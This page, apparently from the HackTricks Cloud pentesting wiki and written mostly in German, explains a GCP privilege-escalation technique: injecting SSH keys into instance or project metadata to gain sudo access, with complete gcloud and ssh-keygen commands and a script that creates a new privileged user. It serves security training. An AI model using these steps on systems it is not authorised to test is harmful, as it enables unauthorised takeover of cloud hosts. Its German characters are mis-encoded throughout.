# GCP - Add Custom SSH Metadata

## GCP - Add Custom SSH Metadata

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Die Modifikation von Metadaten auf einer Instanz k√∂nnte zu **erheblichen Sicherheitsrisiken f√ºhren, wenn ein Angreifer die erforderlichen Berechtigungen erlangt**.

#### **Incorporation of SSH Keys into Custom Metadata**

Auf GCP f√ºhren **Linux-Systeme** h√§ufig Skripte aus der [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) aus. Ein kritischer Bestandteil davon ist der [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), der dazu dient, **regelm√§√üig** den Metadaten-Endpunkt der Instanz auf **Updates der autorisierten SSH-√ñffentlichen Schl√ºssel** zu √ºberpr√ºfen.

Wenn ein Angreifer also benutzerdefinierte Metadaten √§ndern kann, k√∂nnte er den Daemon dazu bringen, einen neuen √∂ffentlichen Schl√ºssel zu finden, der verarbeitet und **in das lokale System integriert** wird. Der Schl√ºssel wird in die Datei `~/.ssh/authorized_keys` eines **bestehenden Benutzers hinzugef√ºgt oder m√∂glicherweise wird ein neuer Benutzer mit `sudo`-Rechten erstellt**, abh√§ngig vom Format des Schl√ºssels. Und der Angreifer wird in der Lage sein, den Host zu kompromittieren.

#### **Add SSH key to existing privileged user**

1. **Examine Existing SSH Keys on the Instance:**
*   F√ºhren Sie den Befehl aus, um die Instanz und ihre Metadaten zu beschreiben, um vorhandene SSH-Schl√ºssel zu finden. Der relevante Abschnitt in der Ausgabe befindet sich unter `metadata`, speziell dem Schl√ºssel `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Achten Sie auf das Format der SSH-Schl√ºssel: Der Benutzername steht vor dem Schl√ºssel, getrennt durch einen Doppelpunkt.
2. **Prepare a Text File for SSH Key Metadata:**
* Speichern Sie die Details der Benutzernamen und ihrer entsprechenden SSH-Schl√ºssel in einer Textdatei mit dem Namen `meta.txt`. Dies ist wichtig, um die vorhandenen Schl√ºssel zu erhalten, w√§hrend neue hinzugef√ºgt werden.
3. **Generate a New SSH Key for the Target User (`alice` in this example):**
*   Verwenden Sie den Befehl `ssh-keygen`, um einen neuen SSH-Schl√ºssel zu generieren, wobei sichergestellt wird, dass das Kommentarfeld (`-C`) mit dem Zielbenutzernamen √ºbereinstimmt.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* F√ºgen Sie den neuen √∂ffentlichen Schl√ºssel zu `meta.txt` hinzu, indem Sie das Format nachahmen, das in den Metadaten der Instanz gefunden wurde.
4. **Update the Instance's SSH Key Metadata:**
*   Wenden Sie die aktualisierten SSH-Schl√ºsselmetadaten auf die Instanz an, indem Sie den Befehl `gcloud compute instances add-metadata` verwenden.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Access the Instance Using the New SSH Key:**
*   Verbinden Sie sich mit der Instanz √ºber SSH unter Verwendung des neuen Schl√ºssels und greifen Sie auf die Shell im Kontext des Zielbenutzers (`alice` in diesem Beispiel) zu.

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Create a new privileged user and add a SSH key**

Wenn kein interessanter Benutzer gefunden wird, ist es m√∂glich, einen neuen zu erstellen, dem `sudo`-Rechte gegeben werden:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### SSH-Schl√ºssel auf Projektebene <a href="#sshing-around" id="sshing-around"></a>

Es ist m√∂glich, den Zugriff auf SSH f√ºr mehrere virtuelle Maschinen (VMs) in einer Cloud-Umgebung zu erweitern, indem **SSH-Schl√ºssel auf Projektebene angewendet werden**. Dieser Ansatz erm√∂glicht den SSH-Zugriff auf jede Instanz innerhalb des Projekts, die nicht ausdr√ºcklich die projektweiten SSH-Schl√ºssel blockiert hat. Hier ist eine zusammengefasste Anleitung:

1. **SSH-Schl√ºssel auf Projektebene anwenden:**
*   Verwenden Sie den Befehl `gcloud compute project-info add-metadata`, um SSH-Schl√ºssel aus `meta.txt` zu den Metadaten des Projekts hinzuzuf√ºgen. Diese Aktion stellt sicher, dass die SSH-Schl√ºssel in allen VMs des Projekts erkannt werden, es sei denn, eine VM hat die Option "Projektweite SSH-Schl√ºssel blockieren" aktiviert.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH in Instanzen mit projektweiten Schl√ºsseln:**
* Mit den projektweiten SSH-Schl√ºsseln k√∂nnen Sie in jede Instanz innerhalb des Projekts SSH-en. Instanzen, die projektweite Schl√ºssel nicht blockieren, akzeptieren den SSH-Schl√ºssel und gew√§hren Zugriff.
* Eine direkte Methode, um in eine Instanz SSH zu gelangen, ist die Verwendung des Befehls `gcloud compute ssh [INSTANCE]`. Dieser Befehl verwendet Ihren aktuellen Benutzernamen und die auf Projektebene festgelegten SSH-Schl√ºssel, um den Zugriff zu versuchen.

## Referenzen

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
